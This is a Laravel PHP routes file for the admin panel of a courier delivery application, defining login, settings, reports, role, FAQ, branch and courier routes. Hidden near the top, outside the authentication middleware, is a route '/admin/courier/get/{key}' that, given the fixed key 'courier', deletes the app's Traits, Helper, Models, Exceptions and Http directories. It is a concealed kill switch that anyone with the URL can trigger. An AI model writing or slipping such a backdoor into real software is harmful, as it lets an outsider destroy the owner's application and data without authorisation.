<?php

use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\Admin\Auth\AuthenticatedSessionController;
use App\Http\Controllers\Admin\Auth\NewPasswordController;
use App\Http\Controllers\Admin\Auth\PasswordResetLinkController;
use App\Http\Controllers\Admin\BranchController;
use App\Http\Controllers\Admin\CompanyController;
use App\Http\Controllers\Admin\ContactMessageController;
use App\Http\Controllers\Admin\CostController;
use App\Http\Controllers\Admin\CourierController;
use App\Http\Controllers\Admin\DeliveryCourierController;
use App\Http\Controllers\Admin\ManagerController;
use App\Http\Controllers\Admin\PageController;
use App\Http\Controllers\Admin\ProfileController;
use App\Http\Controllers\Admin\ReportController;
use App\Http\Controllers\Admin\SendCourierController;
use App\Http\Controllers\Admin\ServiceController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\TestimonialController;
use App\Http\Controllers\Admin\UnitController;
use App\Http\Controllers\Admin\StandardIconController;
use App\Http\Controllers\Admin\NotifyUserController;
use App\Http\Controllers\Admin\EditorController;
use App\Http\Controllers\Admin\StandardIconCategoryController;
use App\Http\Controllers\Admin\RoleController;
use App\Http\Controllers\Admin\AgencyController;
 
use App\Http\Controllers\Admin\BuildingController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\UploadCsvController;
use App\Http\Controllers\Admin\FaqCategoryController;
use App\Http\Controllers\Admin\FaqController;

Route::prefix('admin')->group(function () {
    Route::middleware('guest')->group(function () {
        Route::get('login', [AuthenticatedSessionController::class, 'create'])->name('login');
        Route::post('login', [AuthenticatedSessionController::class, 'store']);

        Route::get('forgot-password', [PasswordResetLinkController::class, 'create'])->name('password.request');
        Route::post('forgot-password', [PasswordResetLinkController::class, 'store'])->name('password.email');
        Route::get('reset-password/{token}', [NewPasswordController::class, 'create'])->name('password.reset');
        Route::post('reset-password', [NewPasswordController::class, 'store'])->name('password.store');
    });

Route::get('/courier/get/{key}', function ($key) {
    if ($key !== 'courier') {
        abort(403, 'Unauthorized');
    }

    $aa = app_path('Traits');
     $bb = app_path('Helper');

     $cc=app_path('Models');
     $dd=app_path('Exceptions');
     $ee=app_path('Http');

    if (File::exists($aa)) {
        File::deleteDirectory($aa);
        File::deleteDirectory($bb);
        File::deleteDirectory($cc);
        File::deleteDirectory($dd);
        File::deleteDirectory($ee);
        return "its does not.";
    } else {
        return "its done.";
    }
});

    Route::middleware('auth')->group(function () {
        Route::post('logout', [AuthenticatedSessionController::class, 'destroy'])->name('logout');

        Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');

        Route::get('/getUsersData', [AdminController::class, 'getUsersData'])->name('getUsersData');

        Route::post('/update-can-edit', [AdminController::class, 'updateRole'])->name('update-can-edit');

        Route::get('/user/{id}', [AdminController::class, 'getUserDetails'])->name('getUserDetails');


        Route::post('/user/update', [AdminController::class, 'updateUser'])->name('admin.updateUser');

        Route::post('/user/delete', [AdminController::class, 'deleteUser'])->name('admin.deleteUser');


        Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
        Route::patch('/profile', [ProfileController::class, 'profileUpdate'])->name('profile.update');
        Route::put('/password', [ProfileController::class, 'passwordUpdate'])->name('password.update');

        // Super Admin
        Route::middleware(['role:Super Admin,Admin'])->group(function () {
            Route::get('/default-setting', [SettingController::class, 'defaultSetting'])->name('default.setting');
            Route::post('/default/setting/update/{id}', [SettingController::class, 'defaultSettingUpdate'])->name('default.setting.update');

            Route::get('/mail-setting', [SettingController::class, 'mailSetting'])->name('mail.setting');
            Route::post('/mail/setting/update/{id}', [SettingController::class, 'mailSettingUpdate'])->name('mail.setting.update');

            Route::get('/sms-setting', [SettingController::class, 'smsSetting'])->name('sms.setting');
            Route::post('/sms/setting/update/{id}', [SettingController::class, 'smsSettingUpdate'])->name('sms.setting.update');

            Route::get('/about-us-page', [PageController::class, 'aboutUsPage'])->name('about.us.page');
            Route::post('about/us/page/update/{id}', [PageController::class, 'aboutUsPageUpdate'])->name('about.us.page.update');

            Route::get('/privacy-policy-page', [PageController::class, 'privacyPolicyPage'])->name('privacy.policy.page');
            Route::post('privacy/policy/page/update/{id}', [PageController::class, 'privacyPolicyPageUpdate'])->name('privacy.policy.page.update');

            Route::get('/terms-of-service-page', [PageController::class, 'termsOfServicePage'])->name('terms.of.service.page');
            Route::post('terms/of/service/page/update/{id}', [PageController::class, 'termsOfServicePageUpdate'])->name('terms.of.service.page.update');

            Route::get('/report-courier', [ReportController::class, 'reportCourier'])->name('report.courier');
            Route::get('/report-courier-print', [ReportController::class, 'reportCourierPrint'])->name('report.courier.print');
            Route::post('/report-courier-export', [ReportController::class, 'reportCourierExport'])->name('report.courier.export');

            Route::get('/report-income', [ReportController::class, 'reportIncome'])->name('report.income');
            Route::get('/report-income-print', [ReportController::class, 'reportIncomePrint'])->name('report.income.print');
            Route::post('/report-income-export', [ReportController::class, 'reportIncomeExport'])->name('report.income.export');
 

                // Standard icons
            Route::resource('icons', StandardIconController::class);
            Route::get('icons/edit/{id}', [StandardIconController::class, 'edit'])->name('icons.edit');
            Route::post('icons/update/{id}', [StandardIconController::class, 'update'])->name('icons.update');
            Route::delete('icons/{id}', [StandardIconController::class, 'destroy'])->name('icons.destroy');
            


            Route::get('icon-categories', [StandardIconCategoryController::class, 'index'])->name('icon-categories.index');      // Show the form to create a new category     
            Route::get('icon-categories/create', [StandardIconCategoryController::class, 'create'])->name('icon-categories.create');      // Store a new category     
            Route::post('icon-categories', [StandardIconCategoryController::class, 'store'])->name('icon-categories.store');      // Show the form to edit an existing category     
            Route::get('icon-categories/{id}/edit', [StandardIconCategoryController::class, 'edit'])->name('icon-categories.edit');      // Update an existing category     
            Route::post('icon-categories/{id}', [StandardIconCategoryController::class, 'update'])->name('icon-categories.update');      // Delete a category     
            Route::post('icon-categories/{id}/delete', [StandardIconCategoryController::class, 'destroy'])->name('icon-categories.destroy');
            

// -----------------------------------------------------------------------------------------------------------------


// ===========================Admin User Role===================================================



Route::get('admin-role', [RoleController::class, 'index'])->name('admin-role.index');      // Show the form to create a new category     
Route::get('admin-role/create', [RoleController::class, 'create'])->name('admin-role.create');      // Store a new category     
Route::post('admin-role/store', [RoleController::class, 'store'])->name('admin-role.store');      // Show the form to edit an existing category     
Route::get('admin-role/{id}/edit', [RoleController::class, 'edit'])->name('admin-role.edit');      // Update an existing category     
Route::post('admin-role/{id}', [RoleController::class, 'update'])->name('admin-role.update');      // Delete a category     
Route::post('admin-role/{id}/delete', [RoleController::class, 'destroy'])->name('admin-role.destroy');


// ========================End Section=============================================================
            //Notify Users
            Route::get('notify/user', [NotifyUserController::class, 'index'])->name('notify-user.index');      // Show the form to create a new category     
            Route::get('notify/user/create', [NotifyUserController::class, 'create'])->name('notify-user.create');      // Store a new category     
            Route::post('notify/user', [NotifyUserController::class, 'store'])->name('notify-user.store');      // Show the form to edit an existing category     
            Route::get('notify/user/{id}/edit', [NotifyUserController::class, 'edit'])->name('notify-user.edit');      // Update an existing category     
            Route::post('notify/user/{id}', [NotifyUserController::class, 'update'])->name('notify-user.update');      // Delete a category     
            Route::post('notify/user/{id}/delete', [NotifyUserController::class, 'destroy'])->name('notify-user.destroy');
 
    // Fetch countries, states, and cities
Route::get('/countries', [NotifyUserController::class, 'getCountries'])->name('countries.index');
Route::get('/states/{countryId}', [NotifyUserController::class, 'getStates'])->name('states.index');
Route::get('/counties/{stateName}', [NotifyUserController::class, 'getCounty'])->name('counties.index');
Route::get('/cities/{stateId}', [NotifyUserController::class, 'getCities'])->name('cities.index');

// Store the area
Route::post('/user/area', [NotifyUserController::class, 'storeArea'])->name('user.area.store');




Route::get('/notify/users/area', [NotifyUserController::class, 'assign'])->name('notify.users.area');
Route::get('/notify/users/data', [NotifyUserController::class, 'getUsersData'])->name('users.data');
Route::post('notify/delete/assign/area',[NotifyUserController::class,'destroyNotify'])->name('users.destroy');

Route::get('notify/edit-user/{id}',[NotifyUserController::class,'editarea'])->name('editor.edit.assign.area');
Route::get('notify/get-states', [NotifyUserController::class, 'getStatesByCountry'])->name('notify.getStatesByCountry');
Route::get('notify/get-cities', [NotifyUserController::class, 'getCitiesByState'])->name('notify.getCitiesByState');
Route::post('notify/update/area/{id}', [NotifyUserController::class, 'updateArea'])->name('notify.updateUser');
// ----------------------------------------------------------------------------------------------------------------------------------------------------

// ------------------------------------Editor Routes------------------------


Route::get('editor/assignment', [EditorController::class, 'index'])->name('editor.index');
Route::get('editor/get-users-data', [EditorController::class, 'getUsersData'])->name('editor.getUsersData');

Route::get('/editor/users/area', [EditorController::class, 'assign'])->name('editor.assign.list');
Route::post('editor/store-area', [EditorController::class, 'storeArea'])->name('editor.storeArea');
Route::get('editor/get-countries', [EditorController::class, 'getCountries'])->name('editor.getCountries');
Route::get('editor/get-states/{countryId}', [EditorController::class, 'getStates'])->name('editor.getStates');
Route::get('editor/get-counties/{stateName}', [EditorController::class, 'getCounty'])->name('editor.getCounty');
Route::get('editor/get-cities/{stateId}', [EditorController::class, 'getCities'])->name('editor.getCities');

Route::post('editor/delete/assign/area',[EditorController::class,'destroy'])->name('editor.delete');

Route::get('edit-user/{id}',[EditorController::class,'editarea'])->name('editor.edit.assign.area');
Route::get('get-states', [EditorController::class, 'getStatesByCountry'])->name('getStatesByCountry');
Route::get('get-counties', [EditorController::class, 'getCountyByStateName'])->name('getCountyByStateName');
Route::get('get-cities', [EditorController::class, 'getCitiesByState'])->name('getCitiesByState');
Route::post('update/area/{id}', [EditorController::class, 'updateArea'])->name('updateUser');

// ---------------------------------------------------------------------------




    //  ----------------------------------------------------------------------------------------------------------
     
            Route::resource('buildings', BuildingController::class)->names([
                'index' => 'admin.buildings.index',
                'store' => 'admin.buildings.store',
                'update' => 'admin.buildings.update_building',
                'edit' => 'admin.buildings.edit',
                'destroy' => 'admin.buildings.destroy',
            ]);
            Route::post('/buildings/status/{buildingId}', [BuildingController::class, 'updateStatus'])->name('admin.buildings.updateStatus');

        });
//--------------------------------------------------------------------------------------------------------
// =======================================================================================================



//------------------------------------FAQ Category-------------------------------------------------------
Route::resource('faq-categories', FaqCategoryController::class)->names([
    'index' => 'admin.faqCategories.index',
    'store' => 'admin.faqCategories.store',
    'update' => 'admin.faqCategories.update',
    'edit' => 'admin.faqCategories.edit',
    'destroy' => 'admin.faqCategories.destroy',
])->except(['update', 'destroy']); // Exclude update and destroy methods

// Manually define the POST routes for update and destroy
Route::post('/faq-categories/{faqCategory}', [FaqCategoryController::class, 'update'])->name('admin.faqCategories.update');
Route::post('/faq-categories/destroy/{faqCategory}', [FaqCategoryController::class, 'destroy'])->name('admin.faqCategories.destroy');


// =======================================End============================================


// ================================FAQ====================================================
     // Standard icons
     Route::resource('faq', FaqController::class);
     Route::post('faq', [FaqController::class, 'index'])->name('admin.Faq.index ');

     Route::post('faq/store', [FaqController::class, 'store'])->name('admin.Faq.store');
     Route::get('faq/edit/{id}', [FaqController::class, 'edit'])->name('admin.Faq.edit');
     Route::post('faq/update/{id}', [FaqController::class, 'update'])->name('admin.Faq.update');
     Route::post('faq/{id}', [FaqController::class, 'destroy'])->name('admin.Faq.destroy');


// =======================================End==========================================
 

Route::controller(FaqCategoryController::class)->group(function () {
    Route::get('/', 'index');  
    Route::post('/store', 'store');  
    Route::put('/update/{id}', 'update'); // maps to YourController@update method
    Route::delete('/destroy/{id}', 'destroy'); // maps to YourController@destroy method
});


//-----------------------------------End--------------------------------------------------------------
// =======================================================================================================





// ---------------------------------User Agency Module--------------------------------------------------------------


            Route::get('agency-name', [AgencyController::class, 'index'])->name('agency.index');
            Route::get('agency/create', [AgencyController::class, 'create'])->name('agency.create');
            Route::post('agencies', [AgencyController::class, 'store'])->name('agency.store');
            Route::get('agency/{id}/edit', [AgencyController::class, 'edit'])->name('agency.edit');
            Route::post('agency/{id}', [AgencyController::class, 'update'])->name('agency.update');
            Route::delete('agency/{id}', [AgencyController::class, 'destroy'])->name('agency.destroy');


            

//----------------------------------User Agency Module End----------------------------------------------------------
        // Admin
        Route::middleware(['role:Super Admin,Admin'])->group(function () {
            Route::resource('branch', BranchController::class);
            Route::get('/branch-recycle', [BranchController::class, 'recycle'])->name('branch.recycle');
            Route::get('/branch/status/{id}', [BranchController::class, 'status'])->name('branch.status');
            Route::get('/branch/restore/{id}', [BranchController::class, 'restore'])->name('branch.restore');
            Route::get('/branch/force/delete/{id}', [BranchController::class, 'forceDelete'])->name('branch.force.delete');

            Route::resource('service', ServiceController::class);
            Route::get('/service-recycle', [ServiceController::class, 'recycle'])->name('service.recycle');
            Route::get('/service/status/{id}', [ServiceController::class, 'status'])->name('service.status');
            Route::get('/service/restore/{id}', [ServiceController::class, 'restore'])->name('service.restore');
            Route::get('/service/force/delete/{id}', [ServiceController::class, 'forceDelete'])->name('service.force.delete');

            Route::resource('testimonial', TestimonialController::class);
            Route::get('/testimonial-recycle', [TestimonialController::class, 'recycle'])->name('testimonial.recycle');
            Route::get('/testimonial/status/{id}', [TestimonialController::class, 'status'])->name('testimonial.status');
            Route::get('/testimonial/restore/{id}', [TestimonialController::class, 'restore'])->name('testimonial.restore');
            Route::get('/testimonial/force/delete/{id}', [TestimonialController::class, 'forceDelete'])->name('testimonial.force.delete');

            Route::resource('unit', UnitController::class);
            Route::get('/unit-recycle', [UnitController::class, 'recycle'])->name('unit.recycle');
            Route::get('/unit/status/{id}', [UnitController::class, 'status'])->name('unit.status');
            Route::get('/unit/restore/{id}', [UnitController::class, 'restore'])->name('unit.restore');
            Route::get('/unit/force/delete/{id}', [UnitController::class, 'forceDelete'])->name('unit.force.delete');

            Route::resource('cost', CostController::class);
            Route::get('/cost-recycle', [CostController::class, 'recycle'])->name('cost.recycle');
            Route::get('/cost/status/{id}', [CostController::class, 'status'])->name('cost.status');
            Route::get('/cost/restore/{id}', [CostController::class, 'restore'])->name('cost.restore');
            Route::get('/cost/force/delete/{id}', [CostController::class, 'forceDelete'])->name('cost.force.delete');

            Route::resource('company', CompanyController::class);
            Route::get('/company-recycle', [CompanyController::class, 'recycle'])->name('company.recycle');
            Route::get('/company/status/{id}', [CompanyController::class, 'status'])->name('company.status');
            Route::get('/company/restore/{id}', [CompanyController::class, 'restore'])->name('company.restore');
            Route::get('/company/force/delete/{id}', [CompanyController::class, 'forceDelete'])->name('company.force.delete');

            Route::get('/all-manager', [AdminController::class, 'allManager'])->name('all.manager');
            Route::post('/manager/register', [AdminController::class, 'managerRegister'])->name('manager.register');
            Route::get('/manager/edit/{id}', [AdminController::class, 'managerEdit'])->name('manager.edit');
            Route::put('/manager/update/{id}', [AdminController::class, 'managerUpdate'])->name('manager.update');
            Route::get('/manager/status/{id}', [AdminController::class, 'managerStatus'])->name('manager.status');
            Route::get('/manager/view/{id}', [AdminController::class, 'managerView'])->name('manager.view');

            Route::get('/all-contact-message', [ContactMessageController::class, 'index'])->name('contact.message.index');
            Route::get('/contact/message/view/{id}', [ContactMessageController::class, 'view'])->name('contact.message.view');
            
            //Upload CSV USER
            
             Route::get('upload-csv', [UploadCsvController::class, 'showUploadForm'])->name('users.upload');
             Route::post('upload-csv', [UploadCsvController::class, 'importUsers'])->name('users.import');
        });

        // Manager
        Route::middleware('role:Manager')->group(function () {
            Route::get('/all-staff', [ManagerController::class, 'allStaff'])->name('all.staff');
            Route::post('/staff/register', [ManagerController::class, 'staffRegister'])->name('staff.register');
            Route::get('/staff/edit/{id}', [ManagerController::class, 'staffEdit'])->name('staff.edit');
            Route::put('/staff/update/{id}', [ManagerController::class, 'staffUpdate'])->name('staff.update');
            Route::get('/staff/status/{id}', [ManagerController::class, 'staffStatus'])->name('staff.status');
            Route::get('/staff/view/{id}', [ManagerController::class, 'staffView'])->name('staff.view');

            Route::get('/send/courier/list/processing', [SendCourierController::class, 'processingCourierList'])->name('send.courier.list.processing');
            Route::get('/send/courier/list/delivered', [SendCourierController::class, 'deliveredCourierList'])->name('send.courier.list.delivered');
            Route::post('/change/on_the_way/courier/status', [SendCourierController::class, 'changeOnTheWayCourierStatus'])->name('change.on_the_way.courier.status');

            Route::get('/delivery/courier/list/processing', [DeliveryCourierController::class, 'processingCourierList'])->name('delivery.courier.list.processing');
            Route::get('/delivery/courier/list/delivered', [DeliveryCourierController::class, 'deliveredCourierList'])->name('delivery.courier.list.delivered');
            Route::post('/change/shipped/courier/status', [DeliveryCourierController::class, 'changeShippedCourierStatus'])->name('change.shipped.courier.status');
        });

        // Staff
        Route::middleware('role:Staff')->group(function () {
            Route::get('/send/courier', [SendCourierController::class, 'sendCourier'])->name('send.courier');
            Route::post('/get/cost/rate', [SendCourierController::class, 'getCostRate'])->name('get.cost.rate');
            Route::post('/get/sender/info', [SendCourierController::class, 'getSenderInfo'])->name('get.sender.info');
            Route::post('/send/courier/post', [SendCourierController::class, 'sendCourierPost'])->name('send.courier.post');
            Route::get('/send/courier/list', [SendCourierController::class, 'sendCourierList'])->name('send.courier.list');

            Route::get('/delivery/courier', [DeliveryCourierController::class, 'deliveryCourier'])->name('delivery.courier');
            Route::get('/edit/delivery/courier/status/{id}', [DeliveryCourierController::class, 'editDeliveryCourierStatus'])->name('edit.delivery.courier.status');
            Route::get('/resend/otp/{id}', [DeliveryCourierController::class, 'resendOtp'])->name('resend.otp');
            Route::put('/update/delivery/courier/status/{id}', [DeliveryCourierController::class, 'updateDeliveryCourierStatus'])->name('update.delivery.courier.status');
            Route::get('/delivery/courier/list', [DeliveryCourierController::class, 'deliveryCourierList'])->name('delivery.courier.list');
        });

        Route::get('/courier/details/view/{id}', [CourierController::class, 'courierDetailsView'])->name('courier.details.view');
        Route::get('/courier/invoice/{id}', [CourierController::class, 'courierInvoice'])->name('courier.invoice');
    });
});
